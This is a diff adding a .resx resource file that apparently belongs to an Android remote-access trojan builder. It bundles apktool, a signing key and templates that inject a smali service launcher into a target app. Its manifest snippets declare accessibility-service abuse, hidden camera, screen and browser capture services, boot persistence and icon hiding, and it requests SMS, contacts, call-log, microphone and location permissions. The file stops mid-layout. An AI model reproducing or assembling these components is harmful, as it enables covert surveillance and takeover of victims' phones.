@@ -1,0 +1,787 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<root>
+  <!-- 
+    Microsoft ResX Schema 
+    
+    Version 2.0
+    
+    The primary goals of this format is to allow a simple XML format 
+    that is mostly human readable. The generation and parsing of the 
+    various data types are done through the TypeConverter classes 
+    associated with the data types.
+    
+    Example:
+    
+    ... ado.net/XML headers & schema ...
+    <resheader name="resmimetype">text/microsoft-resx</resheader>
+    <resheader name="version">2.0</resheader>
+    <resheader name="reader">System.Resources.ResXResourceReader, System.Windows.Forms, ...</resheader>
+    <resheader name="writer">System.Resources.ResXResourceWriter, System.Windows.Forms, ...</resheader>
+    <data name="Name1"><value>this is my long string</value><comment>this is a comment</comment></data>
+    <data name="Color1" type="System.Drawing.Color, System.Drawing">Blue</data>
+    <data name="Bitmap1" mimetype="application/x-microsoft.net.object.binary.base64">
+        <value>[base64 mime encoded serialized .NET Framework object]</value>
+    </data>
+    <data name="Icon1" type="System.Drawing.Icon, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
+        <value>[base64 mime encoded string representing a byte array form of the .NET Framework object]</value>
+        <comment>This is a comment</comment>
+    </data>
+                
+    There are any number of "resheader" rows that contain simple 
+    name/value pairs.
+    
+    Each data row contains a name, and value. The row also contains a 
+    type or mimetype. Type corresponds to a .NET class that support 
+    text/value conversion through the TypeConverter architecture. 
+    Classes that don't support this are serialized and stored with the 
+    mimetype set.
+    
+    The mimetype is used for serialized objects, and tells the 
+    ResXResourceReader how to depersist the object. This is currently not 
+    extensible. For a given mimetype the value must be set accordingly:
+    
+    Note - application/x-microsoft.net.object.binary.base64 is the format 
+    that the ResXResourceWriter will generate, however the reader can 
+    read any of the formats listed below.
+    
+    mimetype: application/x-microsoft.net.object.binary.base64
+    value   : The object must be serialized with 
+            : System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
+            : and then encoded with base64 encoding.
+    
+    mimetype: application/x-microsoft.net.object.soap.base64
+    value   : The object must be serialized with 
+            : System.Runtime.Serialization.Formatters.Soap.SoapFormatter
+            : and then encoded with base64 encoding.
+
+    mimetype: application/x-microsoft.net.object.bytearray.base64
+    value   : The object must be serialized into a byte array 
+            : using a System.ComponentModel.TypeConverter
+            : and then encoded with base64 encoding.
+    -->
+  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
+    <xsd:import namespace="http://www.w3.org/XML/1998/namespace" />
+    <xsd:element name="root" msdata:IsDataSet="true">
+      <xsd:complexType>
+        <xsd:choice maxOccurs="unbounded">
+          <xsd:element name="metadata">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" />
+              </xsd:sequence>
+              <xsd:attribute name="name" use="required" type="xsd:string" />
+              <xsd:attribute name="type" type="xsd:string" />
+              <xsd:attribute name="mimetype" type="xsd:string" />
+              <xsd:attribute ref="xml:space" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="assembly">
+            <xsd:complexType>
+              <xsd:attribute name="alias" type="xsd:string" />
+              <xsd:attribute name="name" type="xsd:string" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="data">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" msdata:Ordinal="1" />
+              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
+              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
+              <xsd:attribute ref="xml:space" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="resheader">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" />
+            </xsd:complexType>
+          </xsd:element>
+        </xsd:choice>
+      </xsd:complexType>
+    </xsd:element>
+  </xsd:schema>
+  <resheader name="resmimetype">
+    <value>text/microsoft-resx</value>
+  </resheader>
+  <resheader name="version">
+    <value>2.0</value>
+  </resheader>
+  <resheader name="reader">
+    <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </resheader>
+  <resheader name="writer">
+    <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </resheader>
+  <assembly alias="System.Windows.Forms" name="System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+  <data name="7zip" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\7.exe;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="accessibilityprivatesrcapp" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\accessibilityprivatesrcapp.xml;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;Windows-1252</value>
+  </data>
+  <data name="AccessTag" xml:space="preserve">
+    <value>&lt;service android:enabled="true" android:exported="false" android:label="@string/BaseName" android:name="com.icontrol.protector.AccessServices" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"&gt;
+            &lt;intent-filter&gt;
+                &lt;action android:name="android.accessibilityservice.AccessibilityService"/&gt;
+            &lt;/intent-filter&gt;
+            &lt;meta-data android:name="android.accessibilityservice" android:resource="@xml/accessibilityprivatesrcapp"/&gt;
+        &lt;/service&gt;</value>
+  </data>
+  <data name="Activitychat" xml:space="preserve">
+    <value>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    android:padding="16dp"
+    android:background="#202020"
+    tools:context=".ChatActivity"&gt;
+
+    &lt;TextView
+        android:id="@+id/chattitle"
+        android:layout_width="match_parent"
+        android:layout_height="40dp"
+        android:background="#37000000"
+        android:layout_alignParentStart="true"
+        android:layout_alignParentTop="true"
+        android:layout_alignParentEnd="true"
+        android:layout_marginStart="16dp"
+        android:layout_marginTop="5dp"
+        android:layout_marginEnd="16dp"
+        android:gravity="center"
+        android:textSize="30dp"
+        android:textColor="#fff"
+        android:text="..."/&gt;
+
+
+    &lt;FrameLayout
+        android:id="@+id/framdlayout1"
+        android:layout_width="match_parent"
+        android:layout_height="0dp"
+        android:layout_above="@id/messageEditText"
+        android:layout_below="@id/chattitle"
+        android:layout_marginTop="10dp"
+        android:layout_marginBottom="16dp"
+        android:padding="2dp"
+        android:background="#474747"&gt;
+
+    &lt;ScrollView
+        android:id="@+id/scrollView2"
+        android:layout_width="match_parent"
+        android:layout_height="match_parent"
+        android:background="#202020"&gt;
+
+        &lt;LinearLayout
+            android:id="@+id/chatLayout"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:orientation="vertical" /&gt;
+
+    &lt;/ScrollView&gt;
+&lt;/FrameLayout&gt;
+
+
+    &lt;EditText
+        android:id="@+id/messageEditText"
+        android:layout_width="273dp"
+        android:layout_height="wrap_content"
+        android:layout_alignParentStart="true"
+        android:layout_alignParentBottom="true"
+        android:layout_marginStart="25dp"
+        android:layout_marginEnd="25dp"
+        android:layout_marginBottom="12dp"
+        android:layout_toStartOf="@id/sendButton"
+        android:hint="Type a message..."
+        android:textColor="#fff"
+        android:textColorHint="#fff"
+        android:inputType="text"
+        android:minHeight="48dp"
+        android:background="#323232"
+        android:padding="10dp"
+        android:maxLines="3" /&gt;
+
+    &lt;Button
+        android:id="@+id/sendButton"
+        android:layout_width="65dp"
+        android:layout_height="65dp"
+        android:layout_below="@+id/framdlayout1"
+        android:layout_alignParentEnd="true"
+        android:layout_alignParentBottom="true"
+        android:layout_marginTop="2dp"
+        android:layout_marginEnd="15dp"
+        android:layout_marginBottom="15dp"
+        android:background="#00000000"
+        android:gravity="center"
+        android:text="➤"
+        android:textColor="#008EFF"
+        android:textAlignment="center"
+        android:textSize="25dp"
+       /&gt;
+
+&lt;/RelativeLayout&gt;</value>
+  </data>
+  <data name="ALLPRIM" xml:space="preserve">
+    <value>&lt;uses-permission android:name="android.permission.RECORD_AUDIO" /&gt;#
+&lt;uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" /&gt;#
+&lt;uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" /&gt;#
+&lt;uses-permission android:name="android.permission.READ_PHONE_STATE" /&gt;#
+&lt;uses-permission android:name="android.permission.WAKE_LOCK" /&gt;#
+&lt;uses-permission android:name="com.android.alarm.permission.SET_ALARM" /&gt;#
+&lt;uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" /&gt;#
+&lt;uses-permission android:name="android.permission.ACCESS_WIFI_STATE" /&gt;#
+&lt;uses-permission android:name="android.permission.CHANGE_WIFI_STATE" /&gt;#
+&lt;uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" /&gt;#
+&lt;uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" /&gt;#
+&lt;uses-permission android:name="android.permission.SET_WALLPAPER" /&gt;#
+&lt;uses-permission android:name="android.permission.READ_SMS" /&gt;#
+&lt;uses-permission android:name="android.permission.READ_CALL_LOG" /&gt;#
+&lt;uses-permission android:name="android.permission.READ_CONTACTS" /&gt;#
+&lt;uses-permission android:name="android.permission.GET_ACCOUNTS" /&gt;#
+&lt;uses-permission android:name="android.permission.CAMERA" /&gt;#
+&lt;uses-permission android:name="android.permission.INTERNET" /&gt;#
+&lt;uses-permission android:name="android.permission.SEND_SMS" /&gt;#</value>
+  </data>
+  <data name="APKEditor" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\APKEditor.jar;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="apktool" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\apktool.jar;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="batteryprim" xml:space="preserve">
+    <value>&lt;uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" /&gt;</value>
+  </data>
+  <data name="BootPrim" xml:space="preserve">
+    <value>&lt;uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" /&gt;</value>
+  </data>
+  <data name="certificate" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\certificate.pem;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="DEFserverconfigs" xml:space="preserve">
+    <value>{
+  "ServerApi": "http://localhost/yaarsa/private/yarsap_90061.php",
+  "ServerApi_Customapp": "http://localhost/yaarsa/private/yarsap_91370.php",
+  "Currentsubdir": "/yaarsa/private/"
+}</value>
+  </data>
+  <data name="emptyaccess" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\emptyaccess.xml;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;Windows-1252</value>
+  </data>
+  <data name="Externalstorage" xml:space="preserve">
+    <value>&lt;uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" /&gt;
+    &lt;uses-permission android:name="android.permission.READ_MEDIA_IMAGES"/&gt;
+    &lt;uses-permission android:name="android.permission.READ_MEDIA_VIDEO"/&gt;</value>
+  </data>
+  <data name="FORGROUD" xml:space="preserve">
+    <value>&lt;uses-permission android:name="android.permission.FOREGROUND_SERVICE"/&gt;</value>
+  </data>
+  <data name="key" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\key.pk8;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="luncherIntent" xml:space="preserve">
+    <value>&lt;intent-filter&gt;
+                &lt;action android:name="android.intent.action.MAIN" /&gt;
+                &lt;category android:name="android.intent.category.LAUNCHER" /&gt;
+
+            &lt;/intent-filter&gt;</value>
+  </data>
+  <data name="MainMith" xml:space="preserve">
+    <value>.method public InializeSubsT()V
+    .locals 4
+
+    :try_start_0
+    new-instance v1, Landroid/content/Intent;
+
+    invoke-virtual {p0}, [trgtmain]-&gt;getApplicationContext()Landroid/content/Context;
+
+    move-result-object v2
+
+    const-class v3, Lcom/icontrol/protector/StarterServices;
+
+    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-&gt;&lt;init&gt;(Landroid/content/Context;Ljava/lang/Class;)V
+
+    .local v1, "Strt_int":Landroid/content/Intent;
+    invoke-virtual {p0, v1}, [trgtmain]-&gt;startService(Landroid/content/Intent;)Landroid/content/ComponentName;
+
+    :try_end_0
+    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
+
+    goto :goto_0
+
+    :catch_0
+    move-exception v0
+
+    .local v0, "a":Ljava/lang/Exception;
+    # Exception handling code if needed
+    .end local v0    # "a":Ljava/lang/Exception;
+    .end local v1    # "Strt_int":Landroid/content/Intent;
+    :goto_0
+    return-void
+.end method</value>
+  </data>
+  <data name="ManifistCode" xml:space="preserve">
+    <value>&lt;uses-library android:name="org.apache.http.legacy" android:required="false"/&gt;
+        &lt;provider android:authorities="com.icontrol.protector.provider" android:exported="false" android:grantUriPermissions="true" android:name="androidx.core.content.FileProvider"&gt;
+            &lt;meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/pfs1"/&gt;
+        &lt;/provider&gt;
+        &lt;activity android:exported="true" android:name="com.icontrol.protector.Splasher"/&gt;
+        &lt;activity-alias android:enabled="true" android:exported="true" android:hardwareAccelerated="false" android:icon="@drawable/mylogo" android:label="@string/BaseName" android:name="com.icontrol.protector.A1" android:targetActivity="com.icontrol.protector.Splasher" android:theme="@android:style/Theme.Black.NoTitleBar"&gt;
+        &lt;/activity-alias&gt;
+        &lt;activity-alias android:enabled="false" android:exported="true" android:hardwareAccelerated="false" android:icon="@drawable/notify" android:label=" " android:name="com.icontrol.protector.A2" android:roundIcon="@drawable/notify" android:screenOrientation="sensor" android:targetActivity="com.icontrol.protector.Splasher" android:theme="@android:style/Theme.Translucent.NoTitleBar"&gt;
+        &lt;/activity-alias&gt;
+        &lt;activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:enabled="true" android:exported="true" android:hardwareAccelerated="true" android:launchMode="singleTop" android:name="com.icontrol.protector.ActivMain" android:screenOrientation="sensor" android:theme="@android:style/Theme.Black.NoTitleBar"/&gt;
+        &lt;activity android:enabled="true" android:excludeFromRecents="true" android:exported="true" android:hardwareAccelerated="false" android:icon="@android:color/transparent" android:label=" " android:launchMode="singleTask" android:name="com.icontrol.protector.LockActivity" android:noHistory="true" android:theme="@android:style/Theme.Translucent.NoTitleBar"/&gt;
+        &lt;activity android:excludeFromRecents="true" android:exported="true" android:label="Alerts" android:name="com.icontrol.protector.AlertActivity" android:noHistory="true" android:theme="@android:style/Theme.Translucent.NoTitleBar"/&gt;
+        &lt;activity android:exported="true" android:name="com.icontrol.protector.PermissionsActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar"/&gt;
+        &lt;activity android:exported="true" android:name="com.icontrol.protector.ActivityDraw" android:theme="@android:style/Theme.Translucent.NoTitleBar"/&gt;
+        &lt;activity android:excludeFromRecents="true" android:exported="true" android:hardwareAccelerated="true" android:name="com.icontrol.protector.AccessibilityActivity" android:noHistory="true" android:theme="@android:style/Theme.Translucent.NoTitleBar"/&gt;
+        &lt;activity android:excludeFromRecents="true" android:exported="true" android:name="com.icontrol.protector.RestrectionActivity" android:noHistory="true"/&gt;
+        &lt;activity android:exported="true" android:name="com.icontrol.protector.ActivityCaptureScreen" android:showOnLockScreen="true" android:showWhenLocked="true" android:theme="@android:style/Theme.Translucent.NoTitleBar" android:turnScreenOn="true"/&gt;
+        &lt;activity android:excludeFromRecents="true" android:exported="true" android:name="com.icontrol.protector.RequestDataUsage" android:noHistory="true"/&gt;
+        &lt;activity android:exported="true" android:name="com.icontrol.protector.Requestinstall" android:theme="@android:style/Theme.Translucent.NoTitleBar"/&gt;
+        &lt;activity android:exported="true" android:name="com.icontrol.protector.RequestPermissions2" android:theme="@android:style/Theme.Translucent.NoTitleBar"/&gt;
+        &lt;activity android:excludeFromRecents="true" android:exported="true" android:name="com.icontrol.protector.UninstallActivity" android:noHistory="true" android:theme="@android:style/Theme.Translucent.NoTitleBar"/&gt;
+        &lt;activity android:excludeFromRecents="true" android:exported="true" android:name="com.icontrol.protector.BrodcastActivity" android:noHistory="true" android:theme="@android:style/Theme.Translucent.NoTitleBar"/&gt;
+        &lt;activity android:excludeFromRecents="true" android:exported="true" android:name="com.icontrol.protector.ChatActivity" android:noHistory="true" android:theme="@android:style/Theme.Translucent.NoTitleBar" android:windowSoftInputMode="adjustResize"/&gt;
+        &lt;activity android:excludeFromRecents="true" android:exported="true" android:label="View" android:launchMode="singleInstance" android:name="com.icontrol.protector.WebBrowser" android:theme="@android:style/Theme.Translucent.NoTitleBar"/&gt;
+        &lt;activity android:excludeFromRecents="true" android:exported="true" android:label="View" android:launchMode="singleInstance" android:name="com.icontrol.protector.Webjector" android:theme="@android:style/Theme.Translucent.NoTitleBar"/&gt;
+        &lt;service android:enabled="true" android:exported="true" android:foregroundServiceType="dataSync" android:name="com.icontrol.protector.WorkServices"/&gt;
+        &lt;service android:enabled="true" android:exported="true" android:foregroundServiceType="dataSync" android:name="com.icontrol.protector.CameraCap"/&gt;
+        &lt;service android:enabled="true" android:exported="true" android:foregroundServiceType="dataSync" android:name="com.icontrol.protector.HiddenBrowser"/&gt;
+        &lt;service android:enabled="true" android:exported="true" android:foregroundServiceType="dataSync" android:name="com.icontrol.protector.EngineWorker"/&gt;
+        &lt;service android:enabled="true" android:exported="true" android:foregroundServiceType="dataSync" android:name="com.icontrol.protector.ProxyService"/&gt;
+        &lt;service android:enabled="true" android:exported="true" android:name="com.icontrol.protector.StarterServices"/&gt;
+        &lt;service android:exported="true" android:foregroundServiceType="dataSync" android:name="com.icontrol.protector.LocationMonitor"/&gt;
+        &lt;service android:enabled="true" android:exported="false" android:name="com.icontrol.protector.MyJobService" android:permission="android.permission.BIND_JOB_SERVICE"/&gt;
+        &lt;service android:enabled="true" android:exported="true" android:foregroundServiceType="mediaProjection" android:name="com.icontrol.protector.ScreenCaps"/&gt;
+        &lt;meta-data android:name="REPALCEACCESS" android:value="99999999"/&gt;
+        &lt;receiver android:enabled="true" android:exported="true" android:name="com.icontrol.protector.alarme"&gt;
+            &lt;intent-filter&gt;
+                &lt;action android:name="MY_CUSTOM_ACTION"/&gt;
+            &lt;/intent-filter&gt;
+        &lt;/receiver&gt;
+        &lt;receiver android:enabled="true" android:exported="true" android:name="com.icontrol.protector.BootReceiver"&gt;
+            &lt;intent-filter&gt;
+                &lt;action android:name="android.intent.action.BOOT_COMPLETED"/&gt;
+                &lt;action android:name="android.intent.action.QUICKBOOT_POWERON"/&gt;
+                &lt;action android:name="com.htc.intent.action.QUICKBOOT_POWERON"/&gt;
+                &lt;action android:name="android.intent.action.REBOOT"/&gt;
+            &lt;/intent-filter&gt;
+        &lt;/receiver&gt;
+        &lt;receiver android:enabled="true" android:exported="true" android:name="com.icontrol.protector.ResetServices"&gt;
+            &lt;intent-filter&gt;
+                &lt;action android:name="android.intent.action.AIRPLANE_MODE"/&gt;
+                &lt;action android:name="android.intent.action.BATTERY_LOW"/&gt;
+                &lt;action android:name="android.intent.action.BATTERY_OKAY"/&gt;
+                &lt;action android:name="android.intent.action.LOCALE_CHANGED"/&gt;
+                &lt;action android:name="android.intent.action.TIMEZONE_CHANGED"/&gt;
+                &lt;action android:name="android.intent.action.DEVICE_STORAGE_LOW"/&gt;
+                &lt;action android:name="android.intent.action.DEVICE_STORAGE_OK"/&gt;
+                &lt;action android:name="android.intent.action.ACTION_POWER_CONNECTED"/&gt;
+                &lt;action android:name="android.intent.action.ACTION_POWER_DISCONNECTED"/&gt;
+            &lt;/intent-filter&gt;
+        &lt;/receiver&gt;
+        &lt;activity android:configChanges="keyboard|keyboardHidden|orientation|screenSize|smallestScreenSize" android:documentLaunchMode="intoExisting" android:enabled="true" android:excludeFromRecents="false" android:exported="true" android:keepScreenOn="true" android:launchMode="singleInstance" android:name="com.icontrol.protector.TransparentActivity" android:showOnLockScreen="true" android:showWhenLocked="true" android:theme="@android:style/Theme.Black.NoTitleBar.Fullscreen" android:turnScreenOn="true"/&gt;
+        &lt;activity android:documentLaunchMode="intoExisting" android:enabled="true" android:excludeFromRecents="false" android:exported="true" android:launchMode="singleInstance" android:name="com.icontrol.protector.tofront" android:showOnLockScreen="true" android:showWhenLocked="true" android:theme="@android:style/Theme.Translucent.NoTitleBar" android:turnScreenOn="true"/&gt;
+        &lt;activity android:exported="true" android:name="com.icontrol.protector.Startme" android:theme="@android:style/Theme.Translucent.NoTitleBar"&gt;
+            &lt;intent-filter&gt;
+                &lt;action android:name="com.javadata.scanner.STARTER"/&gt;
+            &lt;/intent-filter&gt;
+        &lt;/activity&gt;
+        &lt;activity android:excludeFromRecents="true" android:label="Google" android:name="com.icontrol.protector.wakeitaiv" android:showForAllUsers="true" android:theme="@android:style/Theme.Translucent.NoTitleBar" android:turnScreenOn="true"/&gt;
+        &lt;provider android:authorities="com.icontrol.protector.androidx-startup" android:exported="false" android:name="androidx.startup.InitializationProvider"&gt;
+            &lt;meta-data android:name="androidx.work.WorkManagerInitializer" android:value="androidx.startup"/&gt;
+            &lt;meta-data android:name="androidx.emoji2.text.EmojiCompatInitializer" android:value="androidx.startup"/&gt;
+            &lt;meta-data android:name="androidx.lifecycle.ProcessLifecycleInitializer" android:value="androidx.startup"/&gt;
+            &lt;meta-data android:name="androidx.profileinstaller.ProfileInstallerInitializer" android:value="androidx.startup"/&gt;
+        &lt;/provider&gt;
+        &lt;service android:directBootAware="false" android:enabled="false" android:exported="false" android:name="androidx.work.impl.background.systemalarm.SystemAlarmService"/&gt;
+        &lt;service android:directBootAware="false" android:enabled="true" android:exported="true" android:name="androidx.work.impl.background.systemjob.SystemJobService" android:permission="android.permission.BIND_JOB_SERVICE"/&gt;
+        &lt;service android:directBootAware="false" android:enabled="true" android:exported="false" android:name="androidx.work.impl.foreground.SystemForegroundService"/&gt;
+        &lt;receiver android:directBootAware="false" android:enabled="true" android:exported="false" android:name="androidx.work.impl.utils.ForceStopRunnable$BroadcastReceiver"/&gt;
+        &lt;receiver android:directBootAware="false" android:enabled="false" android:exported="false" android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryChargingProxy"&gt;
+            &lt;intent-filter&gt;
+                &lt;action android:name="android.intent.action.ACTION_POWER_CONNECTED"/&gt;
+                &lt;action android:name="android.intent.action.ACTION_POWER_DISCONNECTED"/&gt;
+            &lt;/intent-filter&gt;
+        &lt;/receiver&gt;
+        &lt;receiver android:directBootAware="false" android:enabled="false" android:exported="false" android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryNotLowProxy"&gt;
+            &lt;intent-filter&gt;
+                &lt;action android:name="android.intent.action.BATTERY_OKAY"/&gt;
+                &lt;action android:name="android.intent.action.BATTERY_LOW"/&gt;
+            &lt;/intent-filter&gt;
+        &lt;/receiver&gt;
+        &lt;receiver android:directBootAware="false" android:enabled="false" android:exported="false" android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$StorageNotLowProxy"&gt;
+            &lt;intent-filter&gt;
+                &lt;action android:name="android.intent.action.DEVICE_STORAGE_LOW"/&gt;
+                &lt;action android:name="android.intent.action.DEVICE_STORAGE_OK"/&gt;
+            &lt;/intent-filter&gt;
+        &lt;/receiver&gt;
+        &lt;receiver android:directBootAware="false" android:enabled="false" android:exported="false" android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$NetworkStateProxy"&gt;
+            &lt;intent-filter&gt;
+                &lt;action android:name="android.net.conn.CONNECTIVITY_CHANGE"/&gt;
+            &lt;/intent-filter&gt;
+        &lt;/receiver&gt;
+        &lt;receiver android:directBootAware="false" android:enabled="false" android:exported="false" android:name="androidx.work.impl.background.systemalarm.RescheduleReceiver"&gt;
+            &lt;intent-filter&gt;
+                &lt;action android:name="android.intent.action.BOOT_COMPLETED"/&gt;
+                &lt;action android:name="android.intent.action.TIME_SET"/&gt;
+                &lt;action android:name="android.intent.action.TIMEZONE_CHANGED"/&gt;
+            &lt;/intent-filter&gt;
+        &lt;/receiver&gt;
+        &lt;receiver android:directBootAware="false" android:enabled="false" android:exported="false" android:name="androidx.work.impl.background.systemalarm.ConstraintProxyUpdateReceiver"&gt;
+            &lt;intent-filter&gt;
+                &lt;action android:name="androidx.work.impl.background.systemalarm.UpdateProxies"/&gt;
+            &lt;/intent-filter&gt;
+        &lt;/receiver&gt;
+        &lt;receiver android:directBootAware="false" android:enabled="true" android:exported="true" android:name="androidx.work.impl.diagnostics.DiagnosticsReceiver" android:permission="android.permission.DUMP"&gt;
+            &lt;intent-filter&gt;
+                &lt;action android:name="androidx.work.diagnostics.REQUEST_DIAGNOSTICS"/&gt;
+            &lt;/intent-filter&gt;
+        &lt;/receiver&gt;
+        &lt;service android:directBootAware="true" android:exported="false" android:name="androidx.room.MultiInstanceInvalidationService"/&gt;
+        &lt;receiver android:directBootAware="false" android:enabled="true" android:exported="true" android:name="androidx.profileinstaller.ProfileInstallReceiver" android:permission="android.permission.DUMP"&gt;
+            &lt;intent-filter&gt;
+                &lt;action android:name="androidx.profileinstaller.action.INSTALL_PROFILE"/&gt;
+            &lt;/intent-filter&gt;
+            &lt;intent-filter&gt;
+                &lt;action android:name="androidx.profileinstaller.action.SKIP_FILE"/&gt;
+            &lt;/intent-filter&gt;
+            &lt;intent-filter&gt;
+                &lt;action android:name="androidx.profileinstaller.action.SAVE_PROFILE"/&gt;
+            &lt;/intent-filter&gt;
+            &lt;intent-filter&gt;
+                &lt;action android:name="androidx.profileinstaller.action.BENCHMARK_OPERATION"/&gt;
+            &lt;/intent-filter&gt;
+        &lt;/receiver&gt;</value>
+  </data>
+  <data name="ManifistHide" xml:space="preserve">
+    <value>&lt;intent-filter&gt;
+                &lt;action android:name="android.intent.action.MAIN"/&gt;
+                &lt;category android:name="android.intent.category.INFO"/&gt;
+            &lt;/intent-filter&gt;
+            &lt;intent-filter&gt;
+                &lt;action android:name="android.service.quicksettings.action.QS_TILE_PREFERENCES"/&gt;
+            &lt;/intent-filter&gt;
+            &lt;intent-filter&gt;
+                &lt;action android:name="com.android.settings.action.IA_SETTINGS"/&gt;
+            &lt;/intent-filter&gt;
+            &lt;meta-data android:name="com.android.settings.category" android:value="com.android.settings.category.ia.development"/&gt;
+            &lt;meta-data android:name="com.android.settings.summary" android:value=""/&gt;
+            &lt;meta-data android:name="com.android.settings.order" android:value="10"/&gt;
+            &lt;meta-data android:name="com.android.settings.profile" android:value="primary_profile_only"/&gt;</value>
+  </data>
+  <data name="mywebviewer" xml:space="preserve">
+    <value>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    android:orientation="vertical"&gt;
+
+
+    &lt;WebView
+        android:id="@+id/MyView"
+        android:layout_width="match_parent"
+        android:layout_height="match_parent" /&gt;
+
+    &lt;ProgressBar
+        android:id="@+id/progressBar"
+        style="?android:attr/progressBarStyleLarge"
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:layout_alignParentBottom="true"
+        android:layout_alignParentEnd="true"
+        android:layout_margin="16dp"
+        android:visibility="gone" /&gt;
+&lt;/RelativeLayout&gt;</value>
+  </data>
+  <data name="network_security_config" xml:space="preserve">
+    <value>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;network-security-config&gt;
+    &lt;base-config cleartextTrafficPermitted="true" /&gt;
+&lt;/network-security-config&gt;</value>
+  </data>
+  <data name="nointernet" xml:space="preserve">
+    <value>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    android:orientation="vertical"
+    android:background="#292929"&gt;
+
+    &lt;LinearLayout
+        android:layout_width="match_parent"
+        android:layout_height="35dp"
+        android:background="#292929"
+        android:orientation="horizontal"&gt;
+
+    &lt;/LinearLayout&gt;
+    &lt;LinearLayout
+        android:layout_width="match_parent"
+        android:layout_height="75dp"
+
+        android:orientation="horizontal"&gt;
+
+
+
+    &lt;/LinearLayout&gt;
+    &lt;LinearLayout
+        android:layout_width="match_parent"
+        android:layout_height="110dp"
+        android:gravity="center"
+        android:orientation="horizontal"&gt;
+
+        &lt;ImageView
+            android:id="@+id/noneticon"
+            android:layout_width="0px"
+            android:layout_weight="0.4"
+            android:layout_height="match_parent"
+            android:paddingLeft="5dp"
+            android:src="@drawable/connection_error"&gt;&lt;/ImageView&gt;
+
+    &lt;/LinearLayout&gt;
+    &lt;LinearLayout
+        android:layout_width="match_parent"
+        android:layout_height="20dp"
+
+        android:orientation="horizontal"&gt;
+
+    &lt;/LinearLayout&gt;
+    &lt;LinearLayout
+        android:layout_width="match_parent"
+        android:layout_height="match_parent"
+
+        android:orientation="vertical"&gt;
+
+
+        &lt;TextView
